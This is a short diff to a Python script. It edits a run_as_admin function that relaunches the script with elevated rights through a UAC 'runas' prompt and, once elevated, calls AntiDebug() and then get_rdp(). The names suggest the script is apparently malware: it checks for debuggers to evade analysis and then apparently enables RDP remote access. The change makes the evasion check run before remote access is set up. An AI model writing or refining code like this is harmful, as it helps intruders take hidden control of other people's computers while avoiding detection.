@@ -148,8 +148,9 @@ def is_admin():
 def run_as_admin():
     script = os.path.abspath(sys.argv[0])
     if is_admin():
-        get_rdp()
         AntiDebug()
+        get_rdp()
+        
     else:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
 
